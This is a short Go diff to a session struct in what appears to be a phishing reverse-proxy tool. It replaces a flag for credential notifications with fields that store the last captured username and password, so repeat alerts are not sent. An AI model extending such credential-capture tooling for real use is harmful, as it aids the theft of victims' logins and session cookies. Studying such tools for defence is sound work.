@@ -28,8 +28,9 @@ type Session struct {
 	DoneSignal              chan struct{}
 	RemoteAddr              string
 	UserAgent               string
-	CookiesNotificationSent     bool // Track if cookies notification was already sent
-	CredentialsNotificationSent bool // Track if credentials notification was already sent
+	CookiesNotificationSent       bool   // Track if cookies notification was already sent
+	LastNotifiedUsername          string // Track last username sent to avoid duplicates
+	LastNotifiedPassword          string // Track last password sent to avoid duplicates
 }
 
 func NewSession(name string) (*Session, error) {
@@ -54,8 +55,9 @@ func NewSession(name string) (*Session, error) {
 		DoneSignal:              make(chan struct{}),
 		RemoteAddr:              "",
 		UserAgent:               "",
-		CookiesNotificationSent:     false,
-		CredentialsNotificationSent: false,
+		CookiesNotificationSent: false,
+		LastNotifiedUsername:    "",
+		LastNotifiedPassword:    "",
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
